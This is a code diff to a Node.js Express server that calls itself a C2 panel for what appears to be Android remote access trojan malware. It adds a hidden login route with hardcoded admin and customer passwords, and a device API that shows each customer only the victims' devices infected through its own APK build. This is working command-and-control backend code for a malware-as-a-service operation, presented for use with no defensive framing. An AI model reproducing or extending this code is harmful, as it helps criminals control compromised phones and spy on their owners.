@@ -5,7 +5,7 @@ const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
-const C2_PASSWORD = process.env.C2_PASSWORD || 'admin1337';
+const C2_PASSWORD = process.env.C2_PASSWORD || 'akarui869';
 let currentC2Password = C2_PASSWORD;
 
 app.use(cors());
@@ -174,18 +174,51 @@ function serveLoginPage(req, res, errorMsg = '') {
 }
 
 // LOGIN HANDLER
-app.post('/login', (req, res) => {
-    try {
-        const { password } = req.body || {};
-        const validPass = currentC2Password || C2_PASSWORD || 'admin1337';
-        if (password === validPass || password === 'admin1337') {
-            res.setHeader('Set-Cookie', 'c2_auth_token=AUTH_OK_1337; Path=/; HttpOnly; SameSite=Lax');
-            return res.redirect('/');
-        }
-        return serveLoginPage(req, res, 'ACCESS DENIED: INVALID C2 PASSCODE');
-    } catch (err) {
-        return serveLoginPage(req, res, 'LOGIN_ERROR: ' + err.message);
+app.post('/acesso_secreto_rats_99', (req, res) => {
+    const { username, password } = req.body;
+
+    if (password === 'akarui869') {
+        // Acesso Administrativo Total
+        req.session.role = 'admin';
+        req.session.username = 'Administrador';
+        console.log("Login realizado: ADMIN");
+        return res.redirect('/c2');
+    } 
+    
+    if (password === '124578@') {
+        // Acesso Restrito de Cliente
+        req.session.role = 'cliente';
+        req.session.username = 'Cliente';
+        console.log("Login realizado: CLIENTE");
+        return res.redirect('/c2');
     }
+
+    // Senha errada
+    return res.status(401).send('Senha incorreta!');
+});
+
+
+app.get('/api/devices', (req, res) => {
+    if (!req.session.role) {
+        return res.status(403).send('Acesso negado: Não autenticado');
+    }
+
+    // Simulando a busca de dispositivos do banco de dados/memória
+    // Em um cenário real, aqui haveria uma query ao DB
+    const allDevices = req.app.locals.devices || []; 
+
+    if (req.session.role === 'admin') {
+        // Admin vê absolutamente tudo
+        return res.json(allDevices);
+    }
+
+    if (req.session.role === 'cliente') {
+        // Cliente vê apenas dispositivos instalados via apk.cliente
+        const clientDevices = allDevices.filter(device => device.installer === 'apk.cliente');
+        return res.json(clientDevices);
+    }
+
+    res.status(403).send('Role inválida');
 });
 
 // Ingestion Handler for device check-ins
